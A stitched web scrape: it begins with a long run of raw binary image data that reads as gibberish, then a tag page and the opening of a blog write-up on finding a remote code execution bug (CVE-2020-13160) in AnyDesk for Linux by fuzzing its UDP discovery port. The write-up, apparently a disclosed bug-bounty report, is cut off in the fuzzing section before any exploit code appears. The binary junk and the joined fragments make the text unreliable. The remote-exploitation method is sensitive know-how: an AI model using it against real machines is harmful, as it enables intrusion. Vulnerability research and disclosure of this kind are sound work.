�+ Sz�/$��}��>I�/: ���!2!wñ�R7���1��e g9HF;���^�xHO\_��ε���!��`�K`�4��q2Y�sY���X�2MQV��u�a�O�a����j2@�=��u3�������!�ɿ`�/ǡ�t&Da�O�7�Rj�    IDATt̛��0�e���w�}���\_y[���f!n$Y�$wM| �f���:��r�����1e8�^��Ċ��ZO4���NqN�l�8�r`Q�溺� \�X�;\*�����s�s)��R�7L�!��b$Rg�ʶ" )�>�����"�U��G�F�� �� ?C� \r�g��a� ��DoF\ͱ?�4R�"�'0���'ؗ��Jj���M]�!}h��cee��8I�D��7�zH�����ZZz%�����N�EN�UU�p�Ԙt: ��J���] �n�(��T:����r鴹ypc�@M((�������JG�6ҏ�tdK�~�r�S�ѹ���T}W}T���gȻ�g�n1O����U�i`Ⱑj��7y���
���X���ޱr�>Y�����ꧡ��tnnQ� ���0,G&��%F ��s���[����︎����M$齮w�����]l�ݶ���p���D�gY�M�K�N������Ų��~�Km��2ȗ�\*���R���|y����:~�����ـ��<��FBq��\_��ތ�ڧ��v�����%m��-�b�/��\_'��<�PO�L�}��C6�M���F��HN��H�g.̲�
๥���
�|w���|��!�T\�����x��9!���Ij\*�X��8
�Gj y\*��X���� ���#X9N`T�tʻ� �4�(7�q�ΪV�͉�
\_!-v/���^�pC
�p�K�O��Cu�����q��
���7۪���t��w7:\*Q
}��yhk��=}��
1a���nO�Z�䗠���#�A��ʍw�w�����Ei��N�����Ԉ�������Ԗ�|r��$Bv)�d�
��|g�|����ɔ�R��Z���0 �GY�q ���q����^Vv?����4��ôm��yN1F��#%&ہE��S�3MM{9�J��穬|}�G\����5�Y�����l�V���ڵk�J�PӸ�q��
$MҪ���ZD,\_�b=�
�aIaV�X���=�c��z ;��S�\Z�R=X�p�-[�Ԗ?�:�S�O�:��>ds��v/��k�v�}>ԚHF�,������̖\_�d�獴�Q]v?Ԇ�ͮ��l����XauB�Z=>d�k�l�l��n�n"a��e�O�)�{/=b!߰~Wڏf�W�"ifP�AٟXRj?�"�έ�e6�Ϳ��J��m#m��lË���(����ؿ��\6���
�i�}����`��G�΄J,�I��1A0�!wQ�sG؎�k�����r�]��f��u�%rU��&@�|�&�����W�7��.L4{T�De�Z}֤���htm�3���Z�m.�=�H��� ��@t���\_�;
k��p���?�1,�5��Ԩ�[�ڛ�� �~��}���L,��c����.L����UG yÁF{לk`�`2��^���6�
g;
�s�5h�7�;�nM|�eߗKT��.r��t�Y
�j��P��=�� �W���MX��q6���?N�ۉ�}3|km�}d�H�=+�q�L>��Ծ���IGit�
�=��\_@��I�X\v���������!sIY1q�[i�tj�X
�ò}%��Ս�K`��G���:�.��A� ���~��͂~Ǵ�U� }�o�P��.@����Z��D���]��R �
T4�R�5yRR�C(K�=>>0>���v�����\��"�8|�b@q��O9j�Bi��,>���J��Ap/͞=��A�$) I�E����)nB��7���74�°2߁󬬉lc9;���|���9�ék��")�H�Lc����b�!�
����4KE����c��/&
�\_��~���+�4Q�$�1�f������k��ߢ����AV �~n��Cr7 �Ch�,�g����+ )�����բ��/ �gÒLR����=�&���?�r���;�@廅mK���Q6������42���������ˢ�Ur�/����'+)�~��ApI����r�D�7%����
�
�$C�`�T��,�����u��0���䤤lgU��[�KǏ���؛�ʘ���$�J/`���a��;�O��������(���]ES�:X^�t�W� ��.��vG��&-��I�hH: �I�ҁ��
�T[��z.�N8s{��g�uc�w�^�y�tn�Ν{O����5[m|�x��]iK���>%oJ�<M^�j:����br������VK�lJ1^�� ���/�����)n��b���w��A�ld��5��M����f�V>m��Ui�qQ\�
�v&�hs�������4�xC���\*(vP�^�=��m��˚+ڌ@���~�?u��ڌ�:VvY��.+���� �Q��ge��O�V���y�& �i�M����Zѩǎ�E4����/�R�]��� ���`sԗ��dg}�q��F��GupW
,���S�Lq����Y}] �]�#L��q���w�]�� %оi�&�c)��x��@��8cņ��P��'V��G}��;y����l\_��\*U`����L�y�q�zL�����,� ����r�B�\*ױ���
������l����fm��C�g�(+�
/����)���P���/�{�xo�JQ���5��m�;�^O���+Pfi�B��@2pFɱ���Lɷ��\/���y�N��%�{�QZo����M#m�E�sg�ξ6��Ո�^��]��࿡dL�Z�~8oB��s�HEq�U�0�W�CJP9QR��A������~��b��tO�S�#��.�Qd�E^Qu[��>J���h��&�j��Ƣ���^8��(�c5k�-�\_ބB���@��= ����Ju��M�9�Ѵ���֖X�n|/B�HN�c�}��(x��5�\_�c��������5�Z����Bޙ�鮾iPQ^H���� ����!:﹨��zz-�[:\*�>�d�2�'?���ţ윉y'�7������
����D��Lc���O��ȯ(��&�R(�;|�p�w�wY��79��Q���̞�;�|��u�����.�JZZ�����S�����
���K��&-m�sNM%"iv��c�(�>~���6�?���HHm&J��-py����y��q곲F�<99݄�O��"��^
�?ӕ�\_R}N�R~��?Q E�9�z�)dM�b)����@������c��̢�s��\e��x�.��"B�6�0����ر�$!�p[�d�-�\_���Reپ���m9�!;����\*l-r�E��(��mk"����Y�޺H.�1�n]���xzQ�U�C)��˱��?���>ho���]V~Y���vc\�<���#�C|?Z�/\*{���~g���g�0~yE�}g<q�;(��,���}��{���������3����Y&�׮�o���p��U�q���ֵ���mh��-ͶZ���𸿾r�]%��P�W�,��nI)Ju|?�o�0��c�A5���d {���t@0 4Z]����?�O?y������~+ ����;g�\_=w�=R��+� �{�E������b�����;��$꺹#h�;U�Ĩ��zs �����5���:�ɳ5�Ⱦ�x�gJI<�M1�?Y{�^���\���
L�I��$�̈́�l8�\_zt�u�ɏN��Z�:�Φ����OA��+O�s!�W�쥿.�N
�Oi�$8�>�<N��8k�V� N����BPn��!VD��] ͥ��?�t�pB0#��� yr��Y<�#F8p��e跬���+�%9��^T�(�@�
.�.�+0\P0�Y���4��I��V#�(2���d�+>��%���x���3 ��{zz ���o���,|2Q��E�)\*ZH�En��+��G҄ Nh�cR�$[:r��|'UM¦O�z����X�z ����;`����Y�|��D���6m�%���;w��3g9P�� ��2�1�]hL��WlOc��q�-��N�$�~լ� @>����H�PqI؁�m8�5�d���66��qt� \[^o�b��E��Q��!?���w����J���,{`����D���������
��v2<[�l�.����9����/N���^�������T��f�]G��f .ia:�Wx-~.\*yo��{%�� �5��+'�uХ��'Mp(}mQީ�Y
Έ���Z�u�#�j�l�I:�T����ab����2����t��98�\*��{�U����I5KF���B�K�P[���
s����H�������!�����dk���]0µEA��)��C�~���v�x+}]]Y��{9}���p
��$�|�BA%x)o+��k���Q�D� ����R�"&���IP��{ D%���LJ4�7�kZ�Tqbi,��<�U�g�!z�Ҥ9���8\�]��-]6�ɏ��\Z�hd�RC� ��,��Li^�Ʃ�4���zF�(�j;弉�.��x���U�K��$���d�0/�f"w%\���xTxz�u.e��j��\�\*�1^��U\*��thBv�О���"��X�z�e����323ܒ��2����(�&Mt�V^����\E9QefgYZj�s ���:��O�p�ث�՟��$!�D8 é(�L�,���-$�.�a�wOU���K���:���9F�\_����r�����d�����C2�"�N' P4~���Xuյ�4V�C`�@P#���Ŷ>C6��~���3�� 0����v�Y: 7Y-���Շ�� �&�Q�x7����mp�}������A��~�B�%��|?2��{09H� ���6�,,�� 8�/mLRߊckg�eI�ś\�U�w?��n@� ��w 7[mA�'\_zꞜ����� �k�r�`�59Q��G�P��6(M~Ҋ�"�Mb�4�� ��뢿��4����n�P�<��o0��K���\*o�?ґ�ʖ�����d,΃+�~g�^��e��Ӷ\$$O450Ii ��C
�-V���L@sESX��v&�5��Ȥ^�5��F�0�ú���ͼ� f������C�}���)��{�97A�\C`BR�ܣt�%�9�{H����i�k��\_��l&�T�\*P�Z���X�z ����� �@¹���裚�P@��OII���+'QK��jߵK<��M�4�&�s�rX�N��;\*���\*�j0%`��H�݁����}�=���k��\g�%��D��g�\8X}�Ɋ��>�E�rB՗"���P�Ub����D��i��e~� ? +s�g`���]P/�yE�p-K��<egžF���W��u�b$�c�X�gy�]yf ��F��((`�|�/
VHj�.|�Z�`?�s&�=|H��ȴ-�����<��u ��/�=\*�f�w�z��~RHzs6}t����gMȷ�L � Yؤ�E�\*�~����>G�s���H�\�`k�i��";�(�60�-���d͡f���[��+�V�:�f2�L&��u��p����C�.�;?�������(��[���:�� ���x?��\�aGPWE;�]ʟ�&:�R�+i �G�qX��1�Z��I�~R�z �N�c�\_I���<�j|.�]VƤ"�W���пG��kА��g��}�m4���G�5P�+��X��?���\Gg�ϛ��\��dbtA�r��s�T>M\_��U^�#eԃ���g��%�vK}t~���k+l]e�]
���P0/e�yZ�:�Z�)��5����w�k,���f��d�"���\*%��}��QǶQ)�=��p\*kz:�::g=�A�H��$@���i��DǓ3��xR� �(��3��f�J��\_TO�#���X�3�+��.���&9�+�8���
�$.��m�[X7���N�&9���ߓ�L���!�^>=���D"�뾉�X�z���C����n�$�įЋR/����^��X����T� z��>G`�s�iQ��P/mj}O<�!#`���ٜ[����C��ALp8�yEhh��\*���?I?[�C��N�u�u��&�
�Q�t۫D.Q�0�`/� �,����:�j�5����<���!����"n~yEm�#�����la(�%�Rvu�����~��;n��7�R[�i���N53�\_�ͤ>������z����W4��ʂ\_~p#}���1W�j�ե��Q���p�n������9�?�s��K�ҘP��D[j�<�\_)��P�������S�j��P���w�g4���O����ȣ~b�ћ4+�@��%��J�)���z�4s���~gS�̻l:���d� �LQ &���L�#�V�\*\*�T� �\_���&��<��36o�<�Ts��hYQ�D���L��s8�Wn��NU`���
Nk=������ٕę�y��?�o�DM}��i���� o����S%r������@L2v1�z���Cv�w��O�\�|�w�T�}�u[@���X���>��j^���@I��hW�ޤ
�A�����S����D��/��ļ޹t�>� <��cW�('��>�>�@��=����ƾ�v�X7.�]�������D\*P�H�� ��@��x{���Q��E���xSf�|n,T\_�M�
4�����ۖ���>c�CTp깎> ��&��\*����5/������������3Щ�Ӿ�N#Ю���l:���[3���w��(�~J"h�
C�IV��j�H aq�E��A���O%�}��9k��ѣ]}�4��Z���sY!�s\*.Շ?�@��S������w��RS󜳨�IUN�R��5٥L#9G]��{W��K�|S��|��.��� �\*�gdi?���]��ms��u�������2�z��d-x�<���r�fE��}eg�\_d������2p��
&p�/Y}kjj-�6mrB�� �Q}������Mٜ�iv�!�c�[@k �v�i�� ?Ze�-��>+ÚA���g�\�J�\*�
�L�|=�$�9}|�4jE)N��\*Zm�ҭ'�P�
�S�8�p�~7{B^�=x���c���'�<��\x�R���V�E�UY�뿹��%/����������$E��C-�6LR�YD����
3?���ß\_AݏǼ��i&��O���̐]�������5�l9c:��-��>�`�:�e ~ �D �Gu����x�NDT5g�����n�ps ����<����m���E1���-5�Vw'è W��.��zG��l��1�:5P��:�N��G�,k����|~ ����2��G��ݒƜ��b�����U����
o�
�r��)��s��.V�/��������.�/�݌,�q����&G��(�Ľ������r��d���08fN���D+'b�hc�C�|��ث�mdB�Jk�L��{~�{d(ՈΣ��/�
�"�%����sIC귌��Κ.+�����"�/ut��$zMrr.������8�~���A�����vZ��N��m2��b� ������S���<s���x�$����[�ޣ�i���ˠ!/�\*
�/�1��K9�ڊB�y�f[�h�)�vLUO���uѷ���Rɰ8�������V=eK�.�J4�g͜�"6669nj"|��E�;� ��=�
�(��h|��O�c���� �W��mϟ�f�K��a7�\*v����l�����V�?�����ۯv�٥(�<���H�:&����҄(j��>f��}~�Q^��G�:-��5�I@b�j+��|x�U��A�� ���g��d�ğKB�J��Rx������$�T��B �R����/Ԏ������8��:��f�pd}۔<���?fDz+�;~�����
�S����R����/}L��D�N�a� t��h@����<�  �IDATr��<[߀f37��r�cϸ����6�����Zd��~��2�h�ax�;�6�i�K��=v͟����U��Oe�\s���b���϶D�P�����Rl?^w�>��\_� Υ}�T��c�g�r��F%�+���F3��,H���7�7$r+�T�� ��k�v$��.��tґ����ᵯ���������>s��!Ҕ.y}v��������i�[\*첹E�LV�ǖz@i�W��+,;�JoM��ɫC�z��ׯ^�3�/(B�R���v"����K�<�>����(��~��?�W)���g�����z����-T�Kp�q����쥴������q��[}q����S ^~5������G������O�<�=�$��:& ~SS���'3�8�{8�~0$'g9`.��4��Moh��~�쬏T-#��6�m�$���ׄ!:�UG�J�o��DY��8
뿂#)) ҩ��ݮ��X�L�>�m���gt9�Bb�����-m��c
����G}�.����s|H
:3���T9^ ��u6rD����ũ�U�Q�Y����ۃ�x�9�x��M���tj3��ȵ��Y����$ۇsT5��9�(���, ����n�����G���x~m�-�0�PnĳF�Z�'�,�7(��+P�X8MO'�+ ��a���K
¤�lO��\*�,���"�\_��x{MI���S �;�2� �}�׊m������$�H.~Ý,�}0N<�u~��Ci�J��5Y�7��������M�]j�N�|:?@/���XT���(y��[��f����J�ݧe`zO��W�k���n��N����y����@R��o�)�=�s�̬�wI���,�\_��t$�P��Xm羉:�i������\_-���m�9i�0ҧ-�쉆F`q+x�A����S�9�=��y?B�sKb^@�p�(�P���v���a�\_l�p\�vx�=o���,���8TVy��:erMt�#Y�`�]89\_���-d�4��ٓ�TF/{�'C���D�fq� \*cQ�c�?�Z���{ׄ��Z]J���L�}
�nb"G܅�ɋ���K�L\�gm3�ﺾ���?���D�w�o���-����f���C�ٟ����N�,��������&�",�SX�Q��3�rl-1\��{x��p�7�����2ZN�܏I7��x�U�a�@�%7�vj�G+\_�:�
M:��m�;��>�Rg�/U[����`V�[~�$F��n�>\_��D>���9o���) ��;9}��"���� ����%�[>�^�H�u�Y��.��^dok�tq�N�㊬���T��"k��$����J�O����'i���.����Yà��#-~�ʋN������7��I�q�Lei?�|��� ���
�N��eǾ�z�e�zXŶ������}�^d��sS+{�tr=��A�%� ���ގ�˴�d+�Ѯ��\t�ůy�]p�y�=�$4�;�v:p��ʣq`v�[c�����}�AH-# V���h0�b�,��ș�H<��,��"M��i��k�s
��F�R�@�
��D2�YRJ})�lS�<�b�$��Җ��@��#������ `q�$������eX���C���ޟQ��LW�Xq|`��kr�-8Al�N�{�+�;��I!�:�z�}�s�a\̉��虒���.~�>P�/��q�Rnק�7G6�+�a�^En��w.`�i�(2�龖>�g�R ߢ��S,�����r< Nn'���t�I7���(�hh�$��9�FG�����<�D��sw%���:-���|��k�j:�e���ծv��N"���J�X����1����Z�W+��Pi�U�N�0:��\_v��}Hd�h�iP�����N��
d2eg���voO������o�Y��m�̹��@,����&/u��I���\�'��WC��Lż�(��ٔ�1.�����ϟ1\��!�4��{D�-�s~��(���˵���8Lߞf�r@��%\K��$��T�rV:��0��Er����g�3���Y%K�u�գ3BvQ�p� dG��
}��Rd9��h�zV���;l6q\R�4P�elg����9/�\*���q��2�!��D�!^�m`S?]�&L�.6��-lJ޽�ȩ���#�.���S��''T�e�S3)x��<8�g�sJe�oi���0�ⵋ��3�})�wuT+�E��Æ����>�v�ظ�\_���Vge5G����󹰣�^��g϶9s�M�N��QK ��n���:0.g��)��}K}�1���w�2��8w�/~虮����t�=���?0����;v�ɶ�cG[k[����^�M�:՞�23� L������ϒX�7vl߂�v� � �����9)7�D�n<�k#�W�)�Z@�S%�
��8��P�.N�aK������9pᑂ����8��>������%�� �I�f?|�?��� �,r`Mx D�a��T�^�;��� �[Y�\_;m��${5rz��xb��h��i=��h��I�PY�O�� Ln��J�-G�2{2�>
�P]�fwڳ���Pf�n��謗C���9�l#
���w�3�9^���sS�]^<̶Li���Zr���U����NêvԖ�0��,���Vu&
�k�2졋���w�\_��c����ɿ
�L����I�&�(�U
����z��EЩ{��$!���f�����-�" �G9�X��d�i#a�����#����)���g
�\_�g���N��.W�eS��}M6\*?�~�h�6��!HP����ې\*�aG�{lTG�=�Uo����%Z׀ %cMvڏ��P��sJr�����0v�R1R��A�:o\_d;N��\*r=}��z�ZvJ�sK�%.�`�\_}s����<)=�6��Y�����'��m>ݧ���q+!����q&ps����B9b���O{3[�I�?��3���dL������;�y�{YY���/���y�ܟ5TD��������\�]��W��y?�}`�������.������z�'�y<�){I�J��"��IT���s�d ��ޟ��'�tB��EՈ��ɀ�}K��.'PP0 ���E`\*�c+yy�>����?%��۽ܷ�4p$�x�������zUwX\*u�����(P�f/�p#�kG{����Ty��\*��veW��9����^{�`�2( ���>H�3��VR�&$m�⹥�����ͯ���R�S�������Op���N��m�GU^ű\U��z�IP�����w��\_[�u���D�������F��!�\~����W��Ǹgr��s��9c���E���}+�M��`��A��xofR�A2zRog �iP�o}�k�>��\��Ib+h\_�������s�G��~St����q/D���c�=���cf�X.��A=u��\_�D�ъG,�z�T��έ^��4��6m���m |�&�T>�Ъ����A<�{�\*���dq��0
�
��j��gy�
��%Z��X�=q S'�W������mX,(74<�B�=�nqp���j�yY\*`m{W����E��5T����6���2z0��Y��e�6΅�R�
M�
h�r�!4��SY��� x����n�Bڀ C�J^�n?e�Gԡ�7 t�x���;�=g�9�m+uۯ�t8�F�ZhF�����]D�� ��De�7CLz�<��s1�>��
f;�k5�W�=����X�wt��q��i���l�l2�L�E P�tf��;� �^�zǷ+@c p:���;z�5�j�1ఐ�2�l�������^��[+��gS�w��ӧ`�ļ�Zɏ������08����d��'�^�&
�b�R��\�F�ڿ�\_8�r�;��r�+�BX�����l�]^a����t������(GE�1PSM����k׳�D��j4�7��Hr�������~+zD`<���򌠙j�#�e�����K};���ڷ�#"���z�
|�8�V�]���k������.����қ�=v�~Q;�W�J��#����+\��ީ��˦�dBi,9Jٓ}�mK��Ux�w3e>�m޸����6�����������nc�g���K:Vsc��Y�ͱt��S~~�%�e܌X�\_�= IU��^�ɧTh��СC.��I�L�z�w�2��ɷ����a����o�
Z��S1��+�@8n/��0�u.>w����~(�2�N�E��'/�=�RQ[�SV+�q�@����.����KތF����x�>̋u"��,�m&
�@v��ؽР��<������fj���ko��FHQ=[ Mt �B�A��P ]m���z�F�r��IVta6H���u���1����<y�m�IOPO�a�y'�,�b?�}%�-����$�L��W�8&�LPV�6�jm�jCMA���3�P{-�oȯ�� L��Z�t3��;�F���0� �f�� �2֢�h�'����
p�\_@ a@��)��Z�� �@�����g����5���p>��Mu?���tMw �V����ݩz���DТ{Z��xk�+~�\*8���p��y/t����
"rA� �⮋�r��J��Wх2G�D�s �2��`��u���O�n^��7l�d~Ǝc{����؎;m��D�h��K��̴�Sl��햚��\ڤcײ,j#M~:�N#̻Ms@���B+;�b����ϡ0��NG�#�0𩀉{�T�53���P�g�˷��|$�G�;>��a�vǶZ q�""Or,��0�� -�tlȊs�8g��m�p+{��Q���%3x�"����{vf����p�5��zF��^�f[����7]45��?��9v+��+i���V��f������ۅ��:�ݦ�ʱ�?}��B�Ui�,�"`�W�ϋ��d
��'��Dw��[���'�G���o!ϩ�����KG��<<�\*F�ٸ�,�)\wMp\z��A���3�n�C�՜Y#2-��8\*Qpy����u�����T���]�1#M}-Ҏ�P�4q|�Sm�O�<�@�rI���m�{R,kń����#��\s���ѹ���tS�yu�`B����/Mʹ��\i�7���=X]�k�M�?�Ϯ�Zq�V4�)�,�M��nx���ϸ.�&�$��L�5(B�~�\%}�C#�rr6�����\_�S.�aY)Оq.��Й&���cI�� o~�^;��c���z-��'�u�������Au�Vv\�Ԟ�i�g��]�Z��Ԩ@
�UUU9����W��a�t�b��I��TO��UNa&/�t�H�
�V�^��������c%�t
4uu[��dJJ�sF핚���WU���g8�]S���3�{���2��6� Pyy��N�h��6̋�ߟ��Pj�1߻w����x�d&���D;Tu�w@)�HQg\*�УG[��g���<���X�$�9��NqZ��%��"䦧��?�e�`�O�4���#�3��D�|w��.��;k�,G ���L��nuj@���6s�LbR���Jm{���Xm�ə��׿>�ou�j�& ��S�˨i���G6ڬ�YV�ґ�� >��=?�a���
�mF���y�Y�O��?Ŋi�&�vY]{�M͛jYȞvr$���T��466�c�=怺��\*�g�wGO�A��?a�%�|���{�{�����[��˳�7/��E����n(��~�\_V0�� �?��ct������U�;�ɨ
���N�?�ar9��4�c�������BQnJ)���X� !��8q#�d�\*��1#�vq+�B��
��B�i�b�/�.���V@�۰,�y]���8ZO�e�s��)��X:���88u#�\_V    IEND�B`�

=== Content from devel0pment.de_1ee8982a_20250119_142557.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: CVE-2020-13160

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from www.linkedin.com_e4244157_20250119_142602.html ===




=== Content from devel0pment.de_685e5ba0_20250119_142604.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881) by [scryh](https://devel0pment.de/?author=1)
# AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

---

# Fuzzing

The AnyDesk application is running multiple processes with different permissions. The most valuable target is the service process `/usr/bin/anydesk --service`, since this process is running with `root` privileges. There are two older CVEs ([CVE-2017-14397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14397) and [CVE-2018-13102](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13102)), which target this process on Windows in order to escalate privileges. Both of these exploits are DLL injection/preloading vulnerabilities, which only work locally. My desire was to find a vulnerability, which can be exploited remotely.

At first we need to figure out which remote communication with the AnyDesk application is possible. This can simply be done by starting the application and using `netstat` to determine on which ports the application is listening:

```

user@w00d:~$ sudo netstat -tulpn | grep anydesk
tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      598/anydesk
udp        0      0 0.0.0.0:50001           0.0.0.0:*                           598/anydesk

```

Accordingly the application is listening on TCP port `7070` and UDP port `50001`. By displaying all anydesk processes, we can see that the listening process is the service process itself (PID `598`). Also recognize the traybar process (PID `2983`) as well as the front-end process (PID `3421`):

```

user@w00d:~$ sudo ps aux | grep anydesk
root       598  0.0  0.3 531172 28620 ?        Ssl  08:56   0:02 /usr/bin/anydesk --service
user      2983  0.0  0.2 744288 23736 tty2     Sl+  08:58   0:00 /usr/bin/anydesk --tray
user      3421  0.0  0.4 864624 37760 tty2     Sl+  09:01   0:00 /usr/bin/anydesk

```

Before we can reasonably fuzz the application, we have to determine what data the application is usually expecting to receive on these ports. In order to get some sample data, we can inspect all traffic related to these ports using `wireshark` while interacting with the application.

According to the observations we can make with wireshark TCP port 7070 is used for the actual remote desktop connection and uses TLS to encrypt the traffic. The details are not relevant for our considerations here. The relevant port is UDP 50001, which is used to announce AnyDesk clients within a local network. On startup of AnyDesk we can see that our client sends UDP packets to `239.255.102.18` in order to announce its presence. The packet contains the hostname (`w00d`), the username (`scryh`), a profile picture as well as a few other information:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_01.png)

Assuming that these announcements are also processed by our own client, we now have some legitimate data in order to fuzz the application. At first I started by fuzzing the application using [fuzzotron](https://github.com/denandz/fuzzotron), which is written in C and is quite fast. fuzzotron uses [radamsa](https://gitlab.com/akihe/radamsa) and/or [blab](https://github.com/aoh/blab) for the mutation of the input data. The setup is straightforward. We simply put our initial data observed in wireshark in a test-case file and then run fuzzotron providing among others the IP address and port as well as the PID, which fuzzotron should monitor for possible crashes.

Unfortunately I could not find any flaws that seemed to be exploitable. So I decided to change the approach. Instead of directly targeting the service process, which is listening on the network socket, we can focus on the front-end process (PID `2983` in the output above). The front-end process is responsible for displaying the GUI to the user and communicates with the service process to exchange information relevant for the GUI. When the service process receives a valid UDP announcement frame this frame is passed to the front-end process in order to display the announced device within the GUI:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

To make our fuzzing input reach the front-end process we have to send valid announcement frames. The problem here is that most of the frames produced by the fuzzer we used so far are not valid, because there are mutated without any knowledge of the specific format of these frames. Accordingly most of the fuzzer-mutated frames are dropped by the service process and never reach the front-end process.

